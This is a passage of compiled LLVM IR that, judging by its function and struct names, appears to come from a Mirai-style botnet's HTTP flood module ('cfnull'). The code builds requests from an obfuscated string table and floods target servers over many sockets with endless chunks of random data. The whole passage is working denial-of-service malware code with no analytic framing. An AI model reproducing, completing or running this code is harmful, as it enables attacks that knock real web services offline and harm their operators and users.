  %533 = getelementptr inbounds i8, i8* %529, i64 %532
  %534 = call i32 @util_strcpy(i8* noundef %533, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  call void @table_unlock_val(i8 noundef zeroext 58)
  %535 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %536 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %537 = call i32 @util_strlen(i8* noundef %536)
  %538 = sext i32 %537 to i64
  %539 = getelementptr inbounds i8, i8* %535, i64 %538
  %540 = call i8* @table_retrieve_val(i32 noundef 58, i32* noundef null)
  %541 = call i32 @util_strcpy(i8* noundef %539, i8* noundef %540)
  call void @table_lock_val(i8 noundef zeroext 58)
  %542 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %543 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %544 = call i32 @util_strlen(i8* noundef %543)
  %545 = sext i32 %544 to i64
  %546 = getelementptr inbounds i8, i8* %542, i64 %545
  %547 = call i32 @util_strcpy(i8* noundef %546, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  call void @table_unlock_val(i8 noundef zeroext 59)
  %548 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %549 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %550 = call i32 @util_strlen(i8* noundef %549)
  %551 = sext i32 %550 to i64
  %552 = getelementptr inbounds i8, i8* %548, i64 %551
  %553 = call i8* @table_retrieve_val(i32 noundef 59, i32* noundef null)
  %554 = call i32 @util_strcpy(i8* noundef %552, i8* noundef %553)
  call void @table_lock_val(i8 noundef zeroext 59)
  %555 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %556 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %557 = call i32 @util_strlen(i8* noundef %556)
  %558 = sext i32 %557 to i64
  %559 = getelementptr inbounds i8, i8* %555, i64 %558
  %560 = call i32 @util_strcpy(i8* noundef %559, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  call void @table_unlock_val(i8 noundef zeroext 60)
  %561 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %562 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %563 = call i32 @util_strlen(i8* noundef %562)
  %564 = sext i32 %563 to i64
  %565 = getelementptr inbounds i8, i8* %561, i64 %564
  %566 = call i8* @table_retrieve_val(i32 noundef 60, i32* noundef null)
  %567 = call i32 @util_strcpy(i8* noundef %565, i8* noundef %566)
  call void @table_lock_val(i8 noundef zeroext 60)
  %568 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %569 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %570 = call i32 @util_strlen(i8* noundef %569)
  %571 = sext i32 %570 to i64
  %572 = getelementptr inbounds i8, i8* %568, i64 %571
  %573 = call i32 @util_strcpy(i8* noundef %572, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  call void @table_unlock_val(i8 noundef zeroext 66)
  %574 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %575 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %576 = call i32 @util_strlen(i8* noundef %575)
  %577 = sext i32 %576 to i64
  %578 = getelementptr inbounds i8, i8* %574, i64 %577
  %579 = call i8* @table_retrieve_val(i32 noundef 66, i32* noundef null)
  %580 = call i32 @util_strcpy(i8* noundef %578, i8* noundef %579)
  call void @table_lock_val(i8 noundef zeroext 66)
  %581 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %582 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %583 = call i32 @util_strlen(i8* noundef %582)
  %584 = sext i32 %583 to i64
  %585 = getelementptr inbounds i8, i8* %581, i64 %584
  %586 = call i32 @util_strcpy(i8* noundef %585, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  call void @table_unlock_val(i8 noundef zeroext 67)
  %587 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %588 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %589 = call i32 @util_strlen(i8* noundef %588)
  %590 = sext i32 %589 to i64
  %591 = getelementptr inbounds i8, i8* %587, i64 %590
  %592 = call i8* @table_retrieve_val(i32 noundef 67, i32* noundef null)
  %593 = call i32 @util_strcpy(i8* noundef %591, i8* noundef %592)
  call void @table_lock_val(i8 noundef zeroext 67)
  %594 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %595 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %596 = call i32 @util_strlen(i8* noundef %595)
  %597 = sext i32 %596 to i64
  %598 = getelementptr inbounds i8, i8* %594, i64 %597
  %599 = call i32 @util_strcpy(i8* noundef %598, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  %600 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %601 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %602 = call i32 @util_strlen(i8* noundef %601)
  %603 = sext i32 %602 to i64
  %604 = getelementptr inbounds i8, i8* %600, i64 %603
  %605 = call i32 @util_strcpy(i8* noundef %604, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  %606 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %607 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %606, i32 0, i32 7
  store i32 83886080, i32* %607, align 4
  %608 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %609 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %608, i32 0, i32 0
  %610 = load i32, i32* %609, align 4
  %611 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %612 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %613 = call i32 @util_strlen(i8* noundef %612)
  %614 = sext i32 %613 to i64
  %615 = call i64 @send(i32 noundef %610, i8* noundef %611, i64 noundef %614, i32 noundef 16384)
  %616 = load i32, i32* %23, align 4
  %617 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %618 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %617, i32 0, i32 3
  store i32 %616, i32* %618, align 4
  %619 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %620 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %619, i32 0, i32 1
  store i8 8, i8* %620, align 4
  %621 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %622 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %621, i32 0, i32 0
  %623 = load i32, i32* %622, align 4
  %624 = srem i32 %623, 64
  %625 = zext i32 %624 to i64
  %626 = shl i64 1, %625
  %627 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %18, i32 0, i32 0
  %628 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %629 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %628, i32 0, i32 0
  %630 = load i32, i32* %629, align 4
  %631 = sdiv i32 %630, 64
  %632 = sext i32 %631 to i64
  %633 = getelementptr inbounds [16 x i64], [16 x i64]* %627, i64 0, i64 %632
  %634 = load i64, i64* %633, align 8
  %635 = or i64 %634, %626
  store i64 %635, i64* %633, align 8
  %636 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %637 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %636, i32 0, i32 0
  %638 = load i32, i32* %637, align 4
  %639 = srem i32 %638, 64
  %640 = zext i32 %639 to i64
  %641 = shl i64 1, %640
  %642 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %17, i32 0, i32 0
  %643 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %644 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %643, i32 0, i32 0
  %645 = load i32, i32* %644, align 4
  %646 = sdiv i32 %645, 64
  %647 = sext i32 %646 to i64
  %648 = getelementptr inbounds [16 x i64], [16 x i64]* %642, i64 0, i64 %647
  %649 = load i64, i64* %648, align 8
  %650 = or i64 %649, %641
  store i64 %650, i64* %648, align 8
  %651 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %652 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %651, i32 0, i32 0
  %653 = load i32, i32* %652, align 4
  %654 = load i32, i32* %19, align 4
  %655 = icmp sgt i32 %653, %654
  br i1 %655, label %656, label %661

656:                                              ; preds = %473
  %657 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %658 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %657, i32 0, i32 0
  %659 = load i32, i32* %658, align 4
  %660 = add nsw i32 %659, 1
  store i32 %660, i32* %19, align 4
  br label %661

661:                                              ; preds = %656, %473
  br label %837

662:                                              ; preds = %467
  %663 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %664 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %663, i32 0, i32 1
  %665 = load i8, i8* %664, align 4
  %666 = zext i8 %665 to i32
  %667 = icmp eq i32 %666, 8
  br i1 %667, label %668, label %793

668:                                              ; preds = %662
  store i32 0, i32* %31, align 4
  %669 = bitcast [1025 x i8]* %32 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %669, i8 0, i64 1025, i1 false)
  %670 = getelementptr inbounds [1025 x i8], [1025 x i8]* %32, i64 0, i64 0
  call void @util_zero(i8* noundef %670, i32 noundef 1025)
  %671 = getelementptr inbounds [1025 x i8], [1025 x i8]* %32, i64 0, i64 0
  call void @rand_alphastr(i8* noundef %671, i32 noundef 1024)
  %672 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %673 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %672, i32 0, i32 7
  %674 = load i32, i32* %673, align 4
  %675 = icmp sle i32 %674, 0
  br i1 %675, label %676, label %681

676:                                              ; preds = %668
  %677 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %678 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %677, i32 0, i32 0
  %679 = load i32, i32* %678, align 4
  %680 = call i64 @send(i32 noundef %679, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.16, i64 0, i64 0), i64 noundef 3, i32 noundef 16384)
  br label %763

681:                                              ; preds = %668
  %682 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %683 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %682, i32 0, i32 7
  %684 = load i32, i32* %683, align 4
  %685 = icmp slt i32 %684, 1024
  br i1 %685, label %686, label %692

686:                                              ; preds = %681
  %687 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %688 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %687, i32 0, i32 7
  %689 = load i32, i32* %688, align 4
  %690 = sext i32 %689 to i64
  %691 = getelementptr inbounds [1025 x i8], [1025 x i8]* %32, i64 0, i64 %690
  store i8 0, i8* %691, align 1
  br label %692

692:                                              ; preds = %686, %681
  %693 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %694 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %693, i32 0, i32 7
  %695 = load i32, i32* %694, align 4
  %696 = icmp sge i32 %695, 1024
  br i1 %696, label %697, label %720

697:                                              ; preds = %692
  %698 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %699 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %698, i32 0, i32 7
  %700 = load i32, i32* %699, align 4
  %701 = srem i32 %700, 1024
  %702 = icmp eq i32 %701, 0
  br i1 %702, label %703, label %720

703:                                              ; preds = %697
  %704 = bitcast [4 x i8]* %33 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 1 %704, i8 0, i64 4, i1 false)
  %705 = getelementptr inbounds [4 x i8], [4 x i8]* %33, i64 0, i64 0
  call void @util_zero(i8* noundef %705, i32 noundef 4)
  %706 = getelementptr inbounds [4 x i8], [4 x i8]* %33, i64 0, i64 0
  %707 = call i8* @util_itoa(i32 noundef 1024, i32 noundef 16, i8* noundef %706)
  %708 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %709 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %708, i32 0, i32 0
  %710 = load i32, i32* %709, align 4
  %711 = getelementptr inbounds [4 x i8], [4 x i8]* %33, i64 0, i64 0
  %712 = getelementptr inbounds [4 x i8], [4 x i8]* %33, i64 0, i64 0
  %713 = call i32 @util_strlen(i8* noundef %712)
  %714 = sext i32 %713 to i64
  %715 = call i64 @send(i32 noundef %710, i8* noundef %711, i64 noundef %714, i32 noundef 16384)
  %716 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %717 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %716, i32 0, i32 0
  %718 = load i32, i32* %717, align 4
  %719 = call i64 @send(i32 noundef %718, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  br label %720

720:                                              ; preds = %703, %697, %692
  %721 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %722 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %721, i32 0, i32 0
  %723 = load i32, i32* %722, align 4
  %724 = getelementptr inbounds [1025 x i8], [1025 x i8]* %32, i64 0, i64 0
  %725 = getelementptr inbounds [1025 x i8], [1025 x i8]* %32, i64 0, i64 0
  %726 = call i32 @util_strlen(i8* noundef %725)
  %727 = sext i32 %726 to i64
  %728 = call i64 @send(i32 noundef %723, i8* noundef %724, i64 noundef %727, i32 noundef 16384)
  %729 = trunc i64 %728 to i32
  store i32 %729, i32* %31, align 4
  %730 = icmp eq i32 %729, -1
  br i1 %730, label %731, label %734

731:                                              ; preds = %720
  %732 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %733 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %732, i32 0, i32 1
  store i8 1, i8* %733, align 4
  br label %840

734:                                              ; preds = %720
  %735 = load i32, i32* %31, align 4
  %736 = getelementptr inbounds [1025 x i8], [1025 x i8]* %32, i64 0, i64 0
  %737 = call i32 @util_strlen(i8* noundef %736)
  %738 = icmp ne i32 %735, %737
  br i1 %738, label %739, label %742

739:                                              ; preds = %734
  %740 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %741 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %740, i32 0, i32 1
  store i8 9, i8* %741, align 4
  br label %742

742:                                              ; preds = %739, %734
  %743 = load i32, i32* %31, align 4
  %744 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %745 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %744, i32 0, i32 7
  %746 = load i32, i32* %745, align 4
  %747 = sub nsw i32 %746, %743
  store i32 %747, i32* %745, align 4
  %748 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %749 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %748, i32 0, i32 0
  %750 = load i32, i32* %749, align 4
  %751 = srem i32 %750, 64
  %752 = zext i32 %751 to i64
  %753 = shl i64 1, %752
  %754 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %18, i32 0, i32 0
  %755 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %756 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %755, i32 0, i32 0
  %757 = load i32, i32* %756, align 4
  %758 = sdiv i32 %757, 64
  %759 = sext i32 %758 to i64
  %760 = getelementptr inbounds [16 x i64], [16 x i64]* %754, i64 0, i64 %759
  %761 = load i64, i64* %760, align 8
  %762 = or i64 %761, %753
  store i64 %762, i64* %760, align 8
  br label %763

763:                                              ; preds = %742, %676
  %764 = load i32, i32* %23, align 4
  %765 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %766 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %765, i32 0, i32 3
  store i32 %764, i32* %766, align 4
  %767 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %768 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %767, i32 0, i32 0
  %769 = load i32, i32* %768, align 4
  %770 = srem i32 %769, 64
  %771 = zext i32 %770 to i64
  %772 = shl i64 1, %771
  %773 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %17, i32 0, i32 0
  %774 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %775 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %774, i32 0, i32 0
  %776 = load i32, i32* %775, align 4
  %777 = sdiv i32 %776, 64
  %778 = sext i32 %777 to i64
  %779 = getelementptr inbounds [16 x i64], [16 x i64]* %773, i64 0, i64 %778
  %780 = load i64, i64* %779, align 8
  %781 = or i64 %780, %772
  store i64 %781, i64* %779, align 8
  %782 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %783 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %782, i32 0, i32 0
  %784 = load i32, i32* %783, align 4
  %785 = load i32, i32* %19, align 4
  %786 = icmp sgt i32 %784, %785
  br i1 %786, label %787, label %792

787:                                              ; preds = %763
  %788 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %789 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %788, i32 0, i32 0
  %790 = load i32, i32* %789, align 4
  %791 = add nsw i32 %790, 1
  store i32 %791, i32* %19, align 4
  br label %792

792:                                              ; preds = %787, %763
  br label %836

793:                                              ; preds = %662
  %794 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %795 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %794, i32 0, i32 1
  %796 = load i8, i8* %795, align 4
  %797 = zext i8 %796 to i32
  %798 = icmp eq i32 %797, 9
  br i1 %798, label %799, label %826

799:                                              ; preds = %793
  %800 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %801 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %800, i32 0, i32 0
  %802 = load i32, i32* %801, align 4
  %803 = srem i32 %802, 64
  %804 = zext i32 %803 to i64
  %805 = shl i64 1, %804
  %806 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %18, i32 0, i32 0
  %807 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %808 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %807, i32 0, i32 0
  %809 = load i32, i32* %808, align 4
  %810 = sdiv i32 %809, 64
  %811 = sext i32 %810 to i64
  %812 = getelementptr inbounds [16 x i64], [16 x i64]* %806, i64 0, i64 %811
  %813 = load i64, i64* %812, align 8
  %814 = or i64 %813, %805
  store i64 %814, i64* %812, align 8
  %815 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %816 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %815, i32 0, i32 0
  %817 = load i32, i32* %816, align 4
  %818 = load i32, i32* %19, align 4
  %819 = icmp sgt i32 %817, %818
  br i1 %819, label %820, label %825

820:                                              ; preds = %799
  %821 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %822 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %821, i32 0, i32 0
  %823 = load i32, i32* %822, align 4
  %824 = add nsw i32 %823, 1
  store i32 %824, i32* %19, align 4
  br label %825

825:                                              ; preds = %820, %799
  br label %835

826:                                              ; preds = %793
  %827 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %828 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %827, i32 0, i32 1
  store i8 0, i8* %828, align 4
  %829 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %830 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %829, i32 0, i32 0
  %831 = load i32, i32* %830, align 4
  %832 = call i32 @close(i32 noundef %831)
  %833 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %834 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %833, i32 0, i32 0
  store i32 -1, i32* %834, align 4
  br label %835

835:                                              ; preds = %826, %825
  br label %836

836:                                              ; preds = %835, %792
  br label %837

837:                                              ; preds = %836, %661
  br label %838

838:                                              ; preds = %837, %466
  br label %839

839:                                              ; preds = %838, %417
  br label %840

840:                                              ; preds = %839, %731, %431, %355
  %841 = load i32, i32* %9, align 4
  %842 = add nsw i32 %841, 1
  store i32 %842, i32* %9, align 4
  br label %316, !llvm.loop !24

843:                                              ; preds = %316
  %844 = load i32, i32* %19, align 4
  %845 = icmp eq i32 %844, 0
  br i1 %845, label %846, label %847

846:                                              ; preds = %843
  br label %281

847:                                              ; preds = %843
  %848 = getelementptr inbounds %struct.timeval, %struct.timeval* %21, i32 0, i32 1
  store i64 0, i64* %848, align 8
  %849 = getelementptr inbounds %struct.timeval, %struct.timeval* %21, i32 0, i32 0
  store i64 1, i64* %849, align 8
  %850 = load i32, i32* %19, align 4
  %851 = call i32 @select(i32 noundef %850, %struct.fd_set* noundef %17, %struct.fd_set* noundef %18, %struct.fd_set* noundef null, %struct.timeval* noundef %21)
  store i32 %851, i32* %20, align 4
  %852 = call i64 @time(i64* noundef null) #6
  %853 = trunc i64 %852 to i32
  store i32 %853, i32* %23, align 4
  %854 = load i32, i32* %20, align 4
  %855 = icmp slt i32 %854, 1
  br i1 %855, label %856, label %857

856:                                              ; preds = %847
  br label %281

857:                                              ; preds = %847
  store i32 0, i32* %9, align 4
  br label %858

858:                                              ; preds = %951, %857
  %859 = load i32, i32* %9, align 4
  %860 = load i32, i32* %15, align 4
  %861 = icmp slt i32 %859, %860
  br i1 %861, label %862, label %954

862:                                              ; preds = %858
  %863 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %864 = load i32, i32* %9, align 4
  %865 = sext i32 %864 to i64
  %866 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %863, i64 %865
  store %struct.attack_cfnull_state* %866, %struct.attack_cfnull_state** %22, align 8
  %867 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %868 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %867, i32 0, i32 0
  %869 = load i32, i32* %868, align 4
  %870 = icmp eq i32 %869, -1
  br i1 %870, label %871, label %872

871:                                              ; preds = %862
  br label %951

872:                                              ; preds = %862
  %873 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %18, i32 0, i32 0
  %874 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %875 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %874, i32 0, i32 0
  %876 = load i32, i32* %875, align 4
  %877 = sdiv i32 %876, 64
  %878 = sext i32 %877 to i64
  %879 = getelementptr inbounds [16 x i64], [16 x i64]* %873, i64 0, i64 %878
  %880 = load i64, i64* %879, align 8
  %881 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %882 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %881, i32 0, i32 0
  %883 = load i32, i32* %882, align 4
  %884 = srem i32 %883, 64
  %885 = zext i32 %884 to i64
  %886 = shl i64 1, %885
  %887 = and i64 %880, %886
  %888 = icmp ne i64 %887, 0
  br i1 %888, label %889, label %930

889:                                              ; preds = %872
  %890 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %891 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %890, i32 0, i32 1
  %892 = load i8, i8* %891, align 4
  %893 = zext i8 %892 to i32
  %894 = icmp eq i32 %893, 2
  br i1 %894, label %895, label %919

895:                                              ; preds = %889
  store i32 0, i32* %34, align 4
  store i32 4, i32* %35, align 4
  %896 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %897 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %896, i32 0, i32 0
  %898 = load i32, i32* %897, align 4
  %899 = bitcast i32* %34 to i8*
  %900 = call i32 @getsockopt(i32 noundef %898, i32 noundef 1, i32 noundef 4, i8* noundef %899, i32* noundef %35) #6
  store i32 %900, i32* %12, align 4
  %901 = load i32, i32* %34, align 4
  %902 = icmp eq i32 %901, 0
  br i1 %902, label %903, label %909

903:                                              ; preds = %895
  %904 = load i32, i32* %12, align 4
  %905 = icmp eq i32 %904, 0
  br i1 %905, label %906, label %909

906:                                              ; preds = %903
  %907 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %908 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %907, i32 0, i32 1
  store i8 4, i8* %908, align 4
  br label %918

909:                                              ; preds = %903, %895
  %910 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %911 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %910, i32 0, i32 0
  %912 = load i32, i32* %911, align 4
  %913 = call i32 @close(i32 noundef %912)
  %914 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %915 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %914, i32 0, i32 0
  store i32 -1, i32* %915, align 4
  %916 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %917 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %916, i32 0, i32 1
  store i8 0, i8* %917, align 4
  br label %951

918:                                              ; preds = %906
  br label %929

919:                                              ; preds = %889
  %920 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %921 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %920, i32 0, i32 1
  %922 = load i8, i8* %921, align 4
  %923 = zext i8 %922 to i32
  %924 = icmp eq i32 %923, 9
  br i1 %924, label %925, label %928

925:                                              ; preds = %919
  %926 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %927 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %926, i32 0, i32 1
  store i8 8, i8* %927, align 4
  br label %928

928:                                              ; preds = %925, %919
  br label %929

929:                                              ; preds = %928, %918
  br label %930

930:                                              ; preds = %929, %872
  %931 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %17, i32 0, i32 0
  %932 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %933 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %932, i32 0, i32 0
  %934 = load i32, i32* %933, align 4
  %935 = sdiv i32 %934, 64
  %936 = sext i32 %935 to i64
  %937 = getelementptr inbounds [16 x i64], [16 x i64]* %931, i64 0, i64 %936
  %938 = load i64, i64* %937, align 8
  %939 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %940 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %939, i32 0, i32 0
  %941 = load i32, i32* %940, align 4
  %942 = srem i32 %941, 64
  %943 = zext i32 %942 to i64
  %944 = shl i64 1, %943
  %945 = and i64 %938, %944
  %946 = icmp ne i64 %945, 0
  br i1 %946, label %947, label %950

947:                                              ; preds = %930
  %948 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %949 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %948, i32 0, i32 1
  store i8 1, i8* %949, align 4
  br label %950

950:                                              ; preds = %947, %930
  br label %951

951:                                              ; preds = %950, %909, %871
  %952 = load i32, i32* %9, align 4
  %953 = add nsw i32 %952, 1
  store i32 %953, i32* %9, align 4
  br label %858, !llvm.loop !25

954:                                              ; preds = %858
  br label %281

955:                                              ; preds = %50, %45
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @attack_get_opt_str(i8 noundef zeroext %0, %struct.attack_option* noundef %1, i8 noundef zeroext %2, i8* noundef %3) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
